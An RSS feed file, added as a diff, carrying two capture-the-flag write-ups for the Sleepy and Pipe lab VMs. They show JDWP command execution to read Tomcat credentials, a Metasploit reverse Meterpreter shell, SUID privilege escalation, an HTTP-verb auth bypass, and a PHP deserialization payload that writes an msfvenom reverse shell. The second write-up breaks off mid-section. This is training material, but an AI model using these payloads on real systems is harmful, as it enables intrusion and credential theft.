@@ -1,0 +1,743 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>/dev/random on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/dev/random/</link>
+    <description>Recent content in /dev/random on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 12 Oct 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/dev/random/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>/dev/random: Sleepy</title>
+      <link>http://rastamouse.me/writeups/2015/sleepy/</link>
+      <pubDate>Mon, 12 Oct 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/sleepy/</guid>
+      <description>
+
+&lt;p&gt;Sleepy is another ‘short’ VM created by &lt;a href=&#34;https://twitter.com/s4gi_&#34;&gt;Sagi-&lt;/a&gt;, although it’s slightly more difficult than &lt;a href=&#34;http://rastamouse.me/blog/2015/dev-random-pipe/&#34;&gt;Pipe&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;ports:98b6e5636154869990609b71ad7243a9&#34;&gt;Ports&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sT -p- -A 192.168.56.103
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#39;t get directory listing: TIMEOUT
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+9001/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.6 1.7.0_71
+FTP allows anonymous login where you can download an image of Sleepy, but there appears to be nothing of interest with it.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;jserv:98b6e5636154869990609b71ad7243a9&#34;&gt;JServ&lt;/h2&gt;
+
+&lt;p&gt;Apache JServ is a really interesting protocol - it’s basically designed to proxy inbound requests from a web server through to an application server. If you try to access port 8009 directly, you get no response.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.56.103:8009
+curl: (56) Recv failure: Connection reset by peer
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;What we have to do, is proxy the requests via Apache using the jk-mod.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# apt-get install libapache2-mod-jk
+
+root@kali:~# vi /etc/apache2/mods-enabled/jk.conf
+JkWorkersFile /etc/libapache2-mod-jk/workers.properties   ---&amp;gt;   JkWorkersFile /etc/apache2/workers.properties
+
+root@kali:~# cp /etc/libapache2-mod-jk/workers.properties /etc/apache2/
+
+root@kali:~# vi /etc/apache2/workers.properties
+worker.ajp13_worker.host=localhost   ---&amp;gt;   worker.ajp13_worker.host=192.168.56.103
+
+root@kali:~# vi /etc/apache2/sites-enabled/000-default.conf
+JKMount /* ajp13_worker
+
+root@kali:~# a2enmod proxy_http
+root@kali:~# a2enmod proxy_ajp
+
+root@kali:~# service apache2 restart
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now if we browse to our localhost, we get Tomcat on the remote host!&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/sleepy/tomcat.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;I tried all the obvious/default passwords for Tomcat Manager, but no success. Time to turn my attention to JDWP.&lt;/p&gt;
+
+&lt;h2 id=&#34;jdwp:98b6e5636154869990609b71ad7243a9&#34;&gt;JDWP&lt;/h2&gt;
+
+&lt;p&gt;We find that we can attach to the JDWP service without any authentication.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# jdb -attach 192.168.56.103:9001
+Set uncaught java.lang.Throwable
+Set deferred uncaught java.lang.Throwable
+Initializing jdb ...
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried to use the &lt;code&gt;Metasploit Java Debug Wire Protocol Remote Code Execution&lt;/code&gt; exploit, but it wouldn’t work. I later found that payloads were getting written to &lt;code&gt;/tmp&lt;/code&gt;, but they weren’t being executed.&lt;/p&gt;
+
+&lt;p&gt;You can execute your own commands manually with some dirty, dirty Java. There is a pretty good summary of it &lt;a href=&#34;http://blog.silentsignal.eu/2014/02/09/jdb-tricks-hacking-java-debug-wire/&#34;&gt;here&lt;/a&gt;. First, we want to find where the &lt;code&gt;tomcat-users&lt;/code&gt; file is stored.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&amp;quot;find / -name tomcat-users.xml&amp;quot;).getInputStream())).readLine())
+  = &amp;quot;/etc/tomcat/tomcat-users.xml&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So there are two ways to go about this - the easiest is to copy the file into the FTP directory and download it via your anonymous login. To find the correct directory, I just did another &lt;code&gt;find&lt;/code&gt; for &lt;code&gt;sleepy.png&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&amp;quot;find / -name sleepy.png&amp;quot;).getInputStream())).readLine())
+  &amp;quot;/var/ftp/pub/sleepy.png&amp;quot;
+
+print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&amp;quot;cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/&amp;quot;).getInputStream())).readLine())
+
+ftp&amp;gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 1002     1002       120456 Jun 18 21:40 sleepy.png
+-rw-r--r--    1 1002     1002         2190 Oct 11 22:51 tomcat-users.xml
+226 Directory send OK.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The other method is to read the file directly. However, there is a bit of an issue when trying to return files that have newlines in them and as mentioned in that post, there is no way to loop to return multiple lines.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/sleepy/loop.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;This is where the split trick comes in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(new java.lang.String(&amp;quot;bashXX-cXXcat /etc/tomcat/tomcat-users.xml|tr &#39;\n&#39; &#39; &#39;&amp;quot;).split(&amp;quot;XX&amp;quot;)).getInputStream())).readLine())
+  = &amp;quot;&amp;lt;?xml version=&#39;1.0&#39; encoding=&#39;utf-8&#39;?&amp;gt; &amp;lt;!--   Licensed to the Apache Software Foundation (ASF) under one or more   contributor license agreements.  See the NOTICE file distributed with   this work for additional information regarding copyright ownership.   The ASF licenses this file to You under the Apache License, Version 2.0   (the &amp;quot;License&amp;quot;); you may not use this file except in compliance with   the License.  You may obtain a copy of the License at        http://www.apache.org/licenses/LICENSE-2.0    Unless required by applicable law or agreed to in writing, software   distributed under the License is distributed on an &amp;quot;AS IS&amp;quot; BASIS,   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.   See the License for the specific language governing permissions and   limitations under the License. --&amp;gt; &amp;lt;tomcat-users&amp;gt; &amp;lt;!--   NOTE:  By default, no user is included in the &amp;quot;manager-gui&amp;quot; role required   to operate the &amp;quot;/manager/html&amp;quot; web application.  If you wish to use this app,   you must define such a user - the username and password are arbitrary. --&amp;gt; &amp;lt;!--   NOTE:  The sample user and role entries below are wrapped in a comment   and thus are ignored when reading this file. Do not forget to remove   &amp;lt;!.. ..&amp;gt; that surrounds them. --&amp;gt;   &amp;lt;role rolename=&amp;quot;tomcat&amp;quot;/&amp;gt;   &amp;lt;role rolename=&amp;quot;role1&amp;quot;/&amp;gt;  &amp;lt;!-- &amp;lt;user username=&amp;quot;tomcat&amp;quot; password=&amp;quot;tomcat&amp;quot; roles=&amp;quot;tomcat,manager-gui,admin,manager-jmx,admin-gui,admin-script,manager,manager-script,manager-status&amp;quot;/&amp;gt; --&amp;gt;   &amp;lt;user username=&amp;quot;both&amp;quot; password=&amp;quot;tomcat&amp;quot; roles=&amp;quot;tomcat,role1&amp;quot;/&amp;gt;   &amp;lt;user username=&amp;quot;role1&amp;quot; password=&amp;quot;tomcat&amp;quot; roles=&amp;quot;role1&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;admin&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;admin-gui&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;admin-script&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;manager&amp;quot;/&amp;gt; &amp;lt;role rolename=&amp;quot;manager-gui&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;manager-script&amp;quot;/&amp;gt; &amp;lt;role rolename=&amp;quot;manager-jmx&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;manager-status&amp;quot;/&amp;gt; &amp;lt;!-- &amp;lt;user name=&amp;quot;admin&amp;quot; password=&amp;quot;adminadmin&amp;quot; roles=&amp;quot;admin,manager,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status&amp;quot; /&amp;gt; --&amp;gt;   &amp;lt;user username=&amp;quot;sl33py&amp;quot; password=&amp;quot;Gu3SSmYStR0NgPa$sw0rD!&amp;quot; roles=&amp;quot;tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status&amp;quot;/&amp;gt;  &amp;lt;/tomcat-users&amp;gt; &amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The reason this works, is that the &lt;code&gt;exec()&lt;/code&gt; method requires an array to be passed, as described &lt;a href=&#34;https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;exec(String[] cmdarray)
+Executes the specified command and arguments in a separate process.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;username=&amp;quot;sl33py&amp;quot; password=&amp;quot;Gu3SSmYStR0NgPa$sw0rD!&amp;quot;&lt;/code&gt; is what we were after - and now we can log into the Tomcat Manager. To get a shell, we’ll use the &lt;code&gt;Tomcat Manager Authenticated Upload Code Execution&lt;/code&gt; module.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;PASSWORD   Gu3SSmYStR0NgPa$sw0rD!
+RHOST      127.0.0.1
+RPORT      80
+TARGETURI  /manager
+USERNAME   sl33py
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I set my target as &lt;code&gt;Linux x86&lt;/code&gt; and used the &lt;code&gt;linux/x86/meterpreter/reverse_tcp&lt;/code&gt; payload, but you could also use a Java-based payload.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf exploit(tomcat_mgr_upload) &amp;gt; exploit
+
+[*] Started reverse handler on 192.168.56.101:4444
+[*] 127.0.0.1:80 - Retrieving session ID and CSRF token...
+[*] 127.0.0.1:80 - Finding CSRF token...
+[*] 127.0.0.1:80 - Uploading and deploying V5bvuvzO1juTdM...
+[*] 127.0.0.1:80 - Uploading 1866 bytes as V5bvuvzO1juTdM.war ...
+[*] 127.0.0.1:80 - Executing V5bvuvzO1juTdM...
+[*] 127.0.0.1:80 - Executing /V5bvuvzO1juTdM/AcVlSx5ZMqE9wtXvp5cLRc3dRPgGXgO.jsp...
+[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
+[*] 127.0.0.1:80 - Finding CSRF token...
+[*] 127.0.0.1:80 - Undeploying V5bvuvzO1juTdM ...
+[*] Sending stage (1495598 bytes) to 192.168.56.103
+[*] Meterpreter session 1 opened (192.168.56.101:4444 -&amp;gt; 192.168.56.103:38344) at 2015-10-13 21:52:42 +0100
+
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;tty-nightmare:98b6e5636154869990609b71ad7243a9&#34;&gt;TTY Nightmare&lt;/h2&gt;
+
+&lt;p&gt;If we go in search for SUID binaries (owned by root), we find a suspicious looking candidate.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sh-4.2$ find / -user root -perm -4000 -print 2&amp;gt; /dev/null
+/usr/bin/mount
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/crontab
+/usr/bin/nightmare   &amp;lt;--- this sucker
+/usr/bin/passwd
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/usernetctl
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/lib64/dbus-1/dbus-daemon-launch-helper
+
+sh-4.2$ ls -l /usr/bin/nightmare
+-rwsr-s---. 1 root tomcat 8669 Jan 18  2015 /usr/bin/nightmare
+
+sh-4.2$ /usr/bin/nightmare
+[-] error: no tty present
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I downloaded the binary to my host so I could analyse it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# file nightmare
+nightmare: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=708d5928a47d433d5b40fca49305e332808e743a, not stripped
+
+root@kali:~# ./nightmare
+sh: 1: /usr/bin/aafire: not found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I downloaded &lt;code&gt;/usr/bin/aafire&lt;/code&gt; and ran &lt;code&gt;nightmare&lt;/code&gt; again. This time I got saw cool ASCII fire going - but then another binary tries to get executed: &lt;code&gt;/usr/bin/sl&lt;/code&gt;. I downloaded this one too, and finally got this:&lt;/p&gt;
+
+&lt;video width=&#34;320&#34; height=&#34;240&#34; controls&gt;
+  &lt;source src=&#34;http://rastamouse.me/img/writeups/sleepy/vid.webm&#34; type=&#34;video/webm&#34;&gt;
+Your browser does not support the video tag.
+&lt;/video&gt;
+
+&lt;p&gt;First the binary checks to see if &lt;code&gt;tty&lt;/code&gt; is present.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mov    esi,0x2
+mov    edi,0x400a0c
+mov    eax,0x0
+call   0x400690 &amp;lt;open@plt&amp;gt;
+
+x/s 0x400a0c
+0x400a0c: &amp;quot;/dev/tty&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There are two functions called &lt;code&gt;fire&lt;/code&gt; and &lt;code&gt;train&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass fire
+
+push   rbp
+mov    rbp,rsp
+mov    edi,0x4009fc
+call   0x400640 &amp;lt;system@plt&amp;gt;
+pop    rbp
+ret
+
+gdb-peda$ x/s 0x4009fc
+0x4009fc: &amp;quot;/usr/bin/aafire&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass train
+
+push   rbp
+mov    rbp,rsp
+mov    edx,0x0
+mov    esi,0x0
+mov    edi,0x0
+mov    eax,0x0
+call   0x400620 &amp;lt;setresuid@plt&amp;gt;
+mov    edx,0x0
+mov    esi,0x0
+mov    edi,0x0
+mov    eax,0x0
+call   0x400630 &amp;lt;setresgid@plt&amp;gt;
+mov    edi,0x4009ec
+call   0x400640 &amp;lt;system@plt&amp;gt;
+pop    rbp
+ret
+
+x/s 0x4009ec
+0x4009ec: &amp;quot;/usr/bin/sl -al&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finally, there is a &lt;code&gt;sigHandler&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass sigHandler
+
+push   rbp
+mov    rbp,rsp
+sub    rsp,0x10
+mov    DWORD PTR [rbp-0x4],edi
+mov    eax,0x0
+call   0x4007cd &amp;lt;train&amp;gt;
+mov    edi,0x0
+call   0x4006a0 &amp;lt;exit@plt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So, to summerise:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;The binary checks for &lt;code&gt;tty&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;(if yes) &lt;code&gt;/usr/bin/aafire&lt;/code&gt; is executed&lt;/li&gt;
+&lt;li&gt;This runs until the user presses Ctrl+C (i.e. a SIGINT)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;setresuid&lt;/code&gt; and &lt;code&gt;setresgid&lt;/code&gt; are both set to &lt;code&gt;0&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/usr/bin/sl -al&lt;/code&gt; is executed&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I found a really ugly way to solve this, without having a proper interactive shell. Using the classic ‘python pty’ trick, the binary will partially run. But first define the new function.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bash-4.2$ function /usr/bin/sl() { /bin/sh; }
+bash-4.2$ export -f /usr/bin/sl
+
+bash-4.2$ /usr/bin/nightmare
+Error opening terminal: unknown.
+[+] Again [y/n]?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, in a second shell:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bash-4.2$ ps aux | grep nightmare
+root  3948    0.0     0.0     4164    356 pts/7   S+  01:41   0:00 /usr/bin/nightmare
+
+bash-4.2$ kill -2 3948
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Go back to the previous shell, and a new root shell should be waiting.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bash-4.2$ /usr/bin/nightmare
+Error opening terminal: unknown.
+[+] Again [y/n]? sh-4.2# id
+uid=0(root) gid=0(root) group=0(root),91(tomcat)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Sagi- has a nice trick for getting a proper interactive shell using &lt;code&gt;busybox&lt;/code&gt;, which you should definitely check out.&lt;/p&gt;
+
+&lt;h2 id=&#34;flag:98b6e5636154869990609b71ad7243a9&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sh-4.2# cat /root/flag.txt
+Well done!
+
+Here&#39;s your flag: 3eb030c6ab099b0a355712fe38d59ffb
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is the MD5 of &lt;code&gt;pewpewpew&lt;/code&gt; :)&lt;/p&gt;
+
+&lt;p&gt;Thanks Sagi- for another awesome VM - I learned a lot doing this one!&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>/dev/random: Pipe</title>
+      <link>http://rastamouse.me/writeups/2015/pipe/</link>
+      <pubDate>Fri, 02 Oct 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/pipe/</guid>
+      <description>
+
+&lt;p&gt;Pipe was a VM created by &lt;a href=&#34;https://twitter.com/s4gi_&#34;&gt;Sagi-&lt;/a&gt; for &lt;a href=&#34;http://zacon.org.za&#34;&gt;ZaCon&lt;/a&gt;.  It&amp;rsquo;s quite a short VM, presumably to fit confortably in a con session - but it&amp;rsquo;s fun nonetheless!&lt;/p&gt;
+
+&lt;h1 id=&#34;scan-dem-ports:378c41c5fac16f89c224b95690922b7e&#34;&gt;Scan dem Ports&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.56.102
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f (DSA)
+|   2048 ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 (RSA)
+|_  256 d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 (ECDSA)
+80/tcp    open  http    Apache httpd
+| http-auth: 
+| HTTP/1.1 401 Unauthorized
+|_  Basic realm=index.php
+|_http-methods: No Allow or Public header in OPTIONS response (status code 401)
+|_http-server-header: Apache
+|_http-title: 401 Unauthorized
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          33500/udp  status
+|_  100024  1          36100/tcp  status
+36100/tcp open  status  1 (RPC #100024)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;verb-abuse:378c41c5fac16f89c224b95690922b7e&#34;&gt;Verb Abuse&lt;/h2&gt;
+
+&lt;p&gt;Hop on over to the web service, and we&amp;rsquo;re blocked by an authorisation prompt.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/pipe/auth.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;If we intercept the traffic in burpsuite, you can see that the page being requested is &lt;code&gt;index.php&lt;/code&gt;.  After doing a bit of tampering, I found that you could bypass the authentication by using an invalid verb.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;MEH /index.php HTTP/1.1
+Host: 192.168.56.102
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next we see a page entitled &amp;ldquo;The Treachery of Images&amp;rdquo; - at the bottom of the page is a hyperlink that runs some javascript.  Looking at the source, we see what is suspiciouslly like serialized data.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;quot;O:4:\&amp;quot;Info\&amp;quot;:4:&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/pipe/rene.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;Intercepting the POST request in Burp confirms this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;param=O:4:&amp;quot;Info&amp;quot;:4:{s:2:&amp;quot;id&amp;quot;;i:1;s:9:&amp;quot;firstname&amp;quot;;s:4:&amp;quot;Rene&amp;quot;;s:7:&amp;quot;surname&amp;quot;;s:8:&amp;quot;Margitte&amp;quot;;s:7:&amp;quot;artwork&amp;quot;;s:23:&amp;quot;The Treachery of Images&amp;quot;;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Also within the source, is the location of some javascript serializing code - navigating to this directory, we find another file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;src=&amp;quot;scriptz/php.js&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Index of /scriptz
+    log.php.BAK
+    php.js
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Peeking at &lt;code&gt;log.php.BAK&lt;/code&gt; reveals the code for the page - it&amp;rsquo;s reasonable to assume that this is a backup of &lt;code&gt;index.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+class Log
+{
+    public $filename = &#39;&#39;;
+    public $data = &#39;&#39;;
+
+    public function __construct()
+    {
+        $this-&amp;gt;filename = &#39;&#39;;
+  $this-&amp;gt;data = &#39;&#39;;
+    }
+
+    public function PrintLog()
+    {
+        $pre = &amp;quot;[LOG]&amp;quot;;
+  $now = date(&#39;Y-m-d H:i:s&#39;);
+
+        $str = &#39;$pre - $now - $this-&amp;gt;data&#39;;
+        eval(&amp;quot;\$str = \&amp;quot;$str\&amp;quot;;&amp;quot;);
+        echo $str;
+    }
+
+    public function __destruct()
+    {
+  file_put_contents($this-&amp;gt;filename, $this-&amp;gt;data, FILE_APPEND);
+    }
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We see that there&amp;rsquo;s a function that could enable us to write files to the web server - a prime opportunity to write a PHP shell.  But first, we&amp;rsquo;ll try something simple.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+class Log {
+
+  public function __construct() {
+    $this-&amp;gt;filename = &#39;/var/www/html/scriptz/test.php&#39;;
+    $this-&amp;gt;data = &#39;&amp;lt;?php phpinfo(); ?&amp;gt;&#39;;
+  }
+
+  public function __destruct() {
+    file_put_contents($this-&amp;gt;filename, $this-&amp;gt;data, FILE_APPEND);
+  }
+}
+
+print serialize(new Log);
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We do have permission to write into the webroot &lt;code&gt;/var/www/html&lt;/code&gt; as well as &lt;code&gt;scriptz&lt;/code&gt;.  Since &lt;code&gt;scriptz&lt;/code&gt; allows us to list the directory, it makes it easier to know if our write has succeeded.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# php put-file.php 
+O:3:&amp;quot;Log&amp;quot;:2:{s:8:&amp;quot;filename&amp;quot;;s:30:&amp;quot;/var/www/html/scriptz/test.php&amp;quot;;s:4:&amp;quot;data&amp;quot;;s:19:&amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now just copy this text as the value for &lt;code&gt;param&lt;/code&gt; in the POST request.  It&amp;rsquo;s easiest to do this via the Burp Repeater.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Index of /scriptz
+    log.php.BAK
+    php.js
+    test.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Go to &lt;code&gt;test.php&lt;/code&gt; just to make sure it works&amp;hellip;&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/pipe/phpinfo.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;Excellent - time to upload a shell.  I opt for a Staged Meterpreter PHP payload, since it&amp;rsquo;s small and flexible.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msfvenom -p php/meterpreter/reverse_php LHOST=192.168.56.101 LPORT=4444 -f raw | base64 | tr -d &#39;\n&#39;
+
+$this-&amp;gt;filename = &#39;/var/www/html/scriptz/shell.php&#39;;
+$this-&amp;gt;data =&#39;&amp;lt;?php eval(base64_decode(\&#39;Lyo8P3BocC[...snip...]BkaWUoKTs=\&#39;)) ?&amp;gt;&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Remember to escape your &lt;code&gt;&#39;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf exploit(handler) &amp;gt; run 
+
+[*] Started reverse handler on 192.168.56.101:4444 
+[*] Starting the payload handler...
+[*] Sending stage (32461 bytes) to 192.168.56.102
+[*] Meterpreter session 1 opened (192.168.56.101:4444 -&amp;gt; 192.168.56.102:48112) at 2015-10-02 21:26:16 +0100
+
+meterpreter &amp;gt; getuid 
+Server username: www-data (33)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;rene:378c41c5fac16f89c224b95690922b7e&#34;&gt;Rene&lt;/h2&gt;
+
+&lt;p&gt;After looking around the file system a bit, I spotted some files in rene&amp;rsquo;s home directory.&lt;/p&gt;
+
